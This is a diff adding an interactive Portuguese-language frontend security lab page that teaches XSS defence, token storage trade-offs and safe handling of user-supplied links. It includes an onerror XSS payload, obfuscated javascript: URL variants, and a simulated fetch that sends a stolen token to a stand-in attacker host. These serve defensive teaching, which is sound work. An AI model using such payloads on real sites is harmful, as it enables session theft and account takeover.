@@ -1,0 +1,365 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Segurança · Lab Frontend Sênior</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:opsz,wght@12..96,500..700&family=JetBrains+Mono:wght@400;500;600&family=Source+Sans+3:wght@400;600;700&display=swap">
+<link rel="stylesheet" href="lab.css">
+<style>
+  .comment { background: var(--surface); border: 1px solid var(--line); border-radius: 8px; padding: 12px 14px; display: grid; gap: 4px; min-height: 64px; }
+  .comment-author { font: 600 13px var(--f-mono); color: var(--muted); }
+  .comment-body { overflow-wrap: anywhere; }
+  .comment-body img { max-width: 40px; }
+  .dom-view { margin: 0; font: 12px/1.5 var(--f-mono); color: var(--muted); overflow-wrap: anywhere; white-space: pre-wrap; }
+  .presets { display: flex; flex-wrap: wrap; gap: 6px; }
+  .attack-out { font: 12.5px/1.55 var(--f-mono); background: var(--surface); border: 1px solid var(--line); border-radius: 8px; padding: 10px 12px; white-space: pre-wrap; overflow-wrap: anywhere; margin: 0; min-height: 60px; }
+  .checks { display: grid; gap: 8px; }
+  .check-row { display: flex; justify-content: space-between; align-items: center; gap: 10px; flex-wrap: wrap; padding: 8px 10px; background: var(--surface); border: 1px solid var(--line); border-radius: 8px; font-size: 14px; }
+</style>
+</head>
+<body data-module="seguranca">
+<header class="topbar"><div class="wrap"><a class="brand" href="index.html"><span class="brand-mark">FS</span>Lab Frontend Sênior</a><nav class="modnav" id="modnav" aria-label="Módulos"></nav></div></header>
+
+<div class="wrap">
+  <header class="page-head">
+    <p class="eyebrow">Módulo · Segurança</p>
+    <h1>Todo dado que vem de fora é suspeito</h1>
+    <p class="lede">No front, a maior parte dos ataques entra por um lugar: texto do usuário sendo tratado como código. Aqui você injeta um script de verdade, vê o que ele consegue roubar e decide onde guardar a autenticação.</p>
+    <ul class="senior">
+      <li><b>Nunca confia em entrada</b>Comentário, parâmetro de URL e resposta de API são dados, nunca HTML.</li>
+      <li><b>Pensa como atacante</b>Pergunta o que um script injetado conseguiria ler e fazer.</li>
+      <li><b>Usa camadas</b>Escapar, sanitizar, CSP e cookies httpOnly: uma camada cobre a falha da outra.</li>
+    </ul>
+  </header>
+
+  <main>
+    <section class="lab" id="xss">
+      <div class="lab-head">
+        <p class="eyebrow">Experimento · XSS</p>
+        <h2>Publique um comentário malicioso</h2>
+        <p>Um comentário de cliente é exibido na tela. Escolha o conteúdo e a forma de exibir. Com <code>innerHTML</code>, o navegador interpreta o texto como HTML, e um atributo <code>onerror</code> vira código executado.</p>
+      </div>
+      <div class="playground">
+        <div class="controls">
+          <div class="field">
+            <span class="field-label">Exemplos</span>
+            <div class="presets">
+              <button type="button" class="btn small" data-preset="normal">Texto comum</button>
+              <button type="button" class="btn small" data-preset="bold">Com negrito</button>
+              <button type="button" class="btn small" data-preset="attack">Ataque</button>
+            </div>
+          </div>
+          <div class="field">
+            <label for="xss-input">Comentário enviado</label>
+            <textarea id="xss-input" spellcheck="false"></textarea>
+          </div>
+          <div class="field">
+            <span class="field-label">Como a tela exibe</span>
+            <div class="seg" role="radiogroup" aria-label="Forma de exibir">
+              <label><input type="radio" name="xss-mode" value="inner" checked><span>innerHTML</span></label>
+              <label><input type="radio" name="xss-mode" value="text"><span>textContent</span></label>
+              <label><input type="radio" name="xss-mode" value="sanit"><span>Sanitizado</span></label>
+            </div>
+          </div>
+          <button type="button" class="btn primary" id="xss-run" style="justify-self:start">Publicar comentário</button>
+        </div>
+        <div class="output">
+          <div class="comment">
+            <span class="comment-author">joao.produtor · agora</span>
+            <div class="comment-body" id="xss-out"></div>
+          </div>
+          <div class="banner bad" id="xss-alarm" hidden><b>O script rodou no navegador da vítima.</b><span id="xss-alarm-detail"></span></div>
+          <div class="banner warn" id="xss-csp" hidden><b>O handler foi bloqueado pela CSP deste ambiente.</b>Sem uma Content Security Policy, ele teria rodado. A CSP é a sua segunda camada de defesa, não a primeira.</div>
+          <div class="banner good" id="xss-safe" hidden><b>Nada executou.</b><span id="xss-safe-detail"></span></div>
+          <div>
+            <p class="code-label">O DOM que o navegador montou</p>
+            <p class="dom-view" id="xss-dom"></p>
+          </div>
+        </div>
+      </div>
+      <div class="code-pair">
+        <div><p class="code-label">Vulnerável</p>
+<pre class="code">el.innerHTML = comentario                <span class="no">// interpreta HTML</span>
+
+&lt;div dangerouslySetInnerHTML={{ __html: comentario }} /&gt;  <span class="no">// React: o nome avisa</span></pre></div>
+        <div><p class="code-label">Seguro</p>
+<pre class="code">el.textContent = comentario              <span class="ok">// sempre texto</span>
+
+&lt;p&gt;{comentario}&lt;/p&gt;                     <span class="ok">// React escapa por padrão</span>
+
+<span class="c">// Precisa aceitar negrito? Sanitize com allowlist:</span>
+DOMPurify.sanitize(html, { ALLOWED_TAGS: ['b', 'i', 'em', 'strong'] })</pre></div>
+      </div>
+      <p class="takeaway"><b>Leitura de sênior.</b> O React já protege você por padrão. O risco aparece quando alguém usa <code>dangerouslySetInnerHTML</code>, insere HTML vindo de um editor rico ou monta um <code>href</code> com dado do usuário. Num code review, procure essas três coisas primeiro.</p>
+    </section>
+
+    <section class="lab" id="token">
+      <div class="lab-head">
+        <p class="eyebrow">Experimento · Armazenamento do token</p>
+        <h2>O que um script injetado consegue levar?</h2>
+        <p>Escolha onde a aplicação guarda o token de acesso e rode um script atacante. Ele executa as mesmas leituras que um XSS real faria.</p>
+      </div>
+      <div class="playground">
+        <div class="controls">
+          <div class="field">
+            <span class="field-label">Onde o token fica</span>
+            <div class="seg" role="radiogroup" aria-label="Local do token">
+              <label><input type="radio" name="tk" value="local" checked><span>localStorage</span></label>
+              <label><input type="radio" name="tk" value="session"><span>sessionStorage</span></label>
+              <label><input type="radio" name="tk" value="memory"><span>Memória</span></label>
+              <label><input type="radio" name="tk" value="cookie"><span>Cookie httpOnly</span></label>
+            </div>
+          </div>
+          <button type="button" class="btn primary" id="tk-attack" style="justify-self:start">Rodar script atacante</button>
+          <pre class="attack-out" id="tk-out" aria-live="polite">O resultado do ataque aparece aqui.</pre>
+        </div>
+        <div class="output">
+          <div class="checks" id="tk-checks"></div>
+        </div>
+      </div>
+      <p class="takeaway"><b>Leitura de sênior.</b> Nenhuma opção torna um XSS inofensivo: mesmo sem ler o token, o script pode fazer requisições em nome da pessoa enquanto a aba estiver aberta. O cookie httpOnly impede o <i>roubo</i> do token, que é o que permite o ataque continuar depois que a aba fecha.</p>
+    </section>
+
+    <section class="lab" id="url">
+      <div class="lab-head">
+        <p class="eyebrow">Experimento · Links com dado do usuário</p>
+        <h2>Esse link é seguro?</h2>
+        <p>Um perfil deixa a pessoa informar o próprio site. Se você coloca esse valor direto no <code>href</code>, um <code>javascript:</code> roda quando alguém clica. Compare a checagem ingênua com a checagem pelo parser de URL.</p>
+      </div>
+      <div class="playground">
+        <div class="controls">
+          <div class="field">
+            <span class="field-label">Exemplos</span>
+            <div class="presets">
+              <button type="button" class="btn small" data-url="https://fazendaboavista.com.br">Site normal</button>
+              <button type="button" class="btn small" data-url="/clientes/42">Caminho relativo</button>
+              <button type="button" class="btn small" data-url="javascript:roubar()">javascript:</button>
+              <button type="button" class="btn small" data-url="  JaVaScRiPt:roubar()">Maiúsculas e espaços</button>
+              <button type="button" class="btn small" data-url="java&#9;script:roubar()">Com tabulação</button>
+            </div>
+          </div>
+          <div class="field">
+            <label for="url-input">Site informado pela pessoa</label>
+            <input id="url-input" type="text" spellcheck="false" autocomplete="off">
+          </div>
+        </div>
+        <div class="output">
+          <div class="checks">
+            <div class="check-row"><span>Checagem ingênua: <code>!url.startsWith('javascript:')</code></span><span id="url-naive"></span></div>
+            <div class="check-row"><span>Parser + allowlist: <code>new URL(url).protocol</code></span><span id="url-safe"></span></div>
+          </div>
+          <p class="hint" id="url-proto"></p>
+          <p style="margin:0">Como fica na tela: <span id="url-render"></span></p>
+        </div>
+      </div>
+      <details class="src">
+        <summary>Ver o código</summary>
+<pre class="code">const PROTOCOLOS_OK = ['http:', 'https:', 'mailto:']
+
+function hrefSeguro(valor) {
+  try {
+    const url = new URL(valor, window.location.origin)  <span class="c">// normaliza como o navegador faz</span>
+    return PROTOCOLOS_OK.includes(url.protocol) ? url.href : null
+  } catch {
+    return null
+  }
+}
+
+<span class="c">// allowlist (o que pode) é mais seguro que blocklist (o que não pode)</span></pre>
+      </details>
+      <p class="takeaway"><b>Leitura de sênior.</b> Valide no front para dar uma boa experiência, mas a regra que protege fica no backend. O front pode ser contornado por qualquer pessoa com o DevTools aberto.</p>
+    </section>
+
+    <section id="decidir"></section>
+  </main>
+
+  <nav class="pager" id="pager" aria-label="Navegação entre módulos"></nav>
+</div>
+
+<script src="lab.js"></script>
+<script>
+const { $, $$, esc } = Lab;
+const FAKE_TOKEN = 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhbmEiLCJyb2xlIjoiYWRtaW4ifQ.lab-demo';
+try { localStorage.setItem('access_token', FAKE_TOKEN); } catch (e) {}
+
+/* XSS */
+let xssHitFlag = false;
+window.xssHit = function () {
+  xssHitFlag = true;
+  let tok = null;
+  try { tok = localStorage.getItem('access_token'); } catch (e) {}
+  $('#xss-alarm').hidden = false;
+  $('#xss-csp').hidden = true;
+  $('#xss-alarm-detail').textContent = tok
+    ? ` Ele leu o token do localStorage (${tok.slice(0, 22)}…) e poderia enviá-lo para outro servidor com um fetch.`
+    : ' Ele tem acesso a tudo que a página acessa.';
+};
+(() => {
+  const PRESETS = {
+    normal: 'Entrega chegou no prazo, recomendo.',
+    bold: 'Entrega <b>muito</b> rápida, recomendo.',
+    attack: 'Ótimo atendimento! <img src="x" onerror="xssHit()">',
+  };
+  const input = $('#xss-input'), out = $('#xss-out');
+  const ALLOWED = new Set(['B', 'STRONG', 'I', 'EM', 'BR']);
+
+  function sanitize(html) {
+    const tpl = document.createElement('template'); // conteúdo de template é inerte: nada carrega nem executa
+    tpl.innerHTML = html;
+    const clean = (node) => {
+      for (const child of [...node.childNodes]) {
+        if (child.nodeType === 1) {
+          if (ALLOWED.has(child.tagName)) {
+            [...child.attributes].forEach((a) => child.removeAttribute(a.name));
+            clean(child);
+          } else {
+            child.replaceWith(document.createTextNode(child.outerHTML));
+          }
+        } else if (child.nodeType !== 3) child.remove();
+      }
+    };
+    clean(tpl.content);
+    return tpl.content;
+  }
+
+  function publish() {
+    const value = input.value;
+    const mode = $('input[name=xss-mode]:checked').value;
+    xssHitFlag = false;
+    $('#xss-alarm').hidden = $('#xss-csp').hidden = $('#xss-safe').hidden = true;
+    if (mode === 'inner') out.innerHTML = value;
+    else if (mode === 'text') out.textContent = value;
+    else out.replaceChildren(sanitize(value));
+    $('#xss-dom').textContent = out.innerHTML || '(vazio)';
+    const dangerous = /on\w+\s*=|<script/i.test(value);
+    setTimeout(() => {
+      if (xssHitFlag || !dangerous) return;
+      if (mode === 'inner') { $('#xss-csp').hidden = false; return; }
+      $('#xss-safe').hidden = false;
+      $('#xss-safe-detail').textContent = mode === 'text'
+        ? ' textContent tratou tudo como texto: as tags aparecem como caracteres.'
+        : ' A allowlist manteve só as tags permitidas, sem atributos. O <img> virou texto.';
+    }, 700);
+  }
+
+  $$('[data-preset]').forEach((b) => b.addEventListener('click', () => { input.value = PRESETS[b.dataset.preset]; publish(); }));
+  $('#xss-run').addEventListener('click', publish);
+  $$('input[name=xss-mode]').forEach((r) => r.addEventListener('change', publish));
+  input.value = PRESETS.bold;
+  publish();
+})();
+
+/* Token */
+(() => {
+  const DATA = {
+    local: [
+      ['Script injetado consegue ler', 'Sim', 'bad'],
+      ['Sobrevive a recarregar a página', 'Sim', 'good'],
+      ['Navegador envia sozinho (risco de CSRF)', 'Não', 'good'],
+      ['Compartilhado entre abas', 'Sim', 'good'],
+    ],
+    session: [
+      ['Script injetado consegue ler', 'Sim', 'bad'],
+      ['Sobrevive a recarregar a página', 'Só na mesma aba', 'warn'],
+      ['Navegador envia sozinho (risco de CSRF)', 'Não', 'good'],
+      ['Compartilhado entre abas', 'Não', 'warn'],
+    ],
+    memory: [
+      ['Script injetado consegue ler', 'Difícil, mas pode usar a sessão', 'warn'],
+      ['Sobrevive a recarregar a página', 'Não, precisa de refresh', 'warn'],
+      ['Navegador envia sozinho (risco de CSRF)', 'Não', 'good'],
+      ['Compartilhado entre abas', 'Não', 'warn'],
+    ],
+    cookie: [
+      ['Script injetado consegue ler', 'Não', 'good'],
+      ['Sobrevive a recarregar a página', 'Sim', 'good'],
+      ['Navegador envia sozinho (risco de CSRF)', 'Sim, exige SameSite', 'warn'],
+      ['Compartilhado entre abas', 'Sim', 'good'],
+    ],
+  };
+  const mode = () => $('input[name=tk]:checked').value;
+  function renderChecks() {
+    $('#tk-checks').innerHTML = DATA[mode()].map(([k, v, tone]) =>
+      `<div class="check-row"><span>${k}</span><span class="pill ${tone}">${v}</span></div>`).join('');
+    $('#tk-out').textContent = 'O resultado do ataque aparece aqui.';
+  }
+  function attack() {
+    const m = mode();
+    const lines = [];
+    if (m === 'local' || m === 'session') {
+      const st = m === 'local' ? localStorage : sessionStorage;
+      try { st.setItem('access_token', FAKE_TOKEN); } catch (e) {}
+      let got = null;
+      try { got = st.getItem('access_token'); } catch (e) {}
+      lines.push(`> ${m}Storage.getItem('access_token')`, `"${got}"`, '', `> fetch('https://atacante.example/roubo?t=' + token)`, 'Token enviado. O atacante usa a conta da vítima de outro computador.');
+    } else if (m === 'memory') {
+      lines.push("> window.accessToken", 'undefined   (o token vive dentro de um módulo, sem referência global)', '', "> fetch('/api/contratos', { method: 'DELETE' })", 'Se o seu cliente HTTP anexa o token automaticamente, o script ainda age como a vítima enquanto a aba está aberta.');
+    } else {
+      lines.push('> document.cookie', JSON.stringify(document.cookie || ''), '(cookies httpOnly não aparecem aqui)', '', 'O token não pode ser levado para fora. O script ainda pode fazer requisições pela página, mas o ataque acaba quando a aba fecha.');
+    }
+    $('#tk-out').textContent = lines.join('\n');
+  }
+  $$('input[name=tk]').forEach((r) => r.addEventListener('change', renderChecks));
+  $('#tk-attack').addEventListener('click', attack);
+  renderChecks();
+})();
+
+/* URL */
+(() => {
+  const input = $('#url-input');
+  const OK = ['http:', 'https:', 'mailto:'];
+  function check() {
+    const raw = input.value;
+    const naiveOk = !raw.startsWith('javascript:');
+    let proto = 'inválida', href = null;
+    try { const u = new URL(raw, 'https://app.exemplo.com.br'); proto = u.protocol; if (OK.includes(u.protocol)) href = u.href; } catch (e) {}
+    const safeOk = !!href;
+    const reallyDangerous = proto === 'javascript:' || proto === 'data:';
+    $('#url-naive').innerHTML = naiveOk
+      ? (reallyDangerous ? '<span class="pill bad">Aprovou um ataque</span>' : '<span class="pill good">Aprovou</span>')
+      : '<span class="pill good">Bloqueou</span>';
+    $('#url-safe').innerHTML = safeOk ? '<span class="pill good">Aprovou</span>' : '<span class="pill good">Bloqueou</span>';
+    $('#url-proto').innerHTML = `O navegador entende o protocolo como <code>${esc(proto)}</code>${raw !== raw.trim() || /\t/.test(raw) ? ', depois de remover espaços e tabulações' : ''}.`;
+    $('#url-render').innerHTML = safeOk
+      ? `<a href="${esc(href)}" target="_blank" rel="noopener noreferrer">${esc(raw)}</a>`
+      : `<span class="pill neutral">link removido</span>`;
+  }
+  $$('[data-url]').forEach((b) => b.addEventListener('click', () => { input.value = b.dataset.url; check(); }));
+  input.addEventListener('input', check);
+  input.value = '  JaVaScRiPt:roubar()';
+  check();
+})();
+
+/* Decisão */
+Lab.decision($('#decidir'), {
+  title: 'Onde guardo a autenticação?',
+  intro: 'A resposta depende de quem controla o backend e de onde ele está. Responda pensando no seu sistema atual.',
+  questions: [
+    { id: 'xss', text: 'A aplicação já se defende de XSS?', hint: 'Sem dangerouslySetInnerHTML com dado do usuário, com CSP configurada, com dependências auditadas.',
+      options: [{ v: 'sim', label: 'Sim' }, { v: 'nao', label: 'Não sei / não' }] },
+    { id: 'dono', text: 'Quem emite o token?',
+      options: [{ v: 'nos', label: 'Nossa própria API' }, { v: 'terceiro', label: 'Um provedor (Auth0, Firebase, Cognito)' }] },
+    { id: 'site', text: 'O front e a API estão no mesmo site?', hint: 'app.empresa.com e api.empresa.com contam como o mesmo site.', when: (a) => a.dono === 'nos',
+      options: [{ v: 'sim', label: 'Sim, mesmo domínio' }, { v: 'nao', label: 'Não, domínios diferentes' }] },
+  ],
+  decide(a) {
+    const xssNote = a.xss === 'nao'
+      ? '<p><b>Antes de qualquer coisa:</b> sem defesa contra XSS, nenhuma escolha de armazenamento protege. Comece pela CSP e pela busca por <code>dangerouslySetInnerHTML</code> no código.</p>' : '';
+    if (a.dono === 'nos' && a.site === 'sim') return {
+      tone: a.xss === 'nao' ? 'warn' : 'good', title: 'Cookie httpOnly emitido pela API',
+      body: xssNote + '<p>O JavaScript não lê o token, e o navegador envia o cookie sozinho. Complete com:</p><ul><li><code>Secure</code> e <code>SameSite=Lax</code> (ou <code>Strict</code>)</li><li>token anti-CSRF nas requisições que alteram dados</li><li>expiração curta e renovação no servidor</li></ul>',
+      code: 'Set-Cookie: session=...; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600' };
+    if (a.dono === 'nos') return {
+      tone: 'warn', title: 'Coloque um BFF no mesmo domínio do front',
+      body: xssNote + '<p>Com domínios diferentes, cookies de terceiros são bloqueados por vários navegadores. Um <i>backend for frontend</i> (uma rota do Next.js ou um proxy) no domínio do app guarda a sessão em cookie httpOnly e repassa as chamadas para a API.</p>' };
+    return {
+      tone: 'warn', title: 'Access token em memória, renovação pelo SDK',
+      body: xssNote + '<p>Deixe o SDK do provedor guardar o access token em memória com vida curta (5 a 15 min) e renovar com <i>refresh token rotation</i>. Evite copiar o token para o localStorage só para sobreviver ao reload.</p>' };
+  },
+});
+</script>
+</body>
+</html>
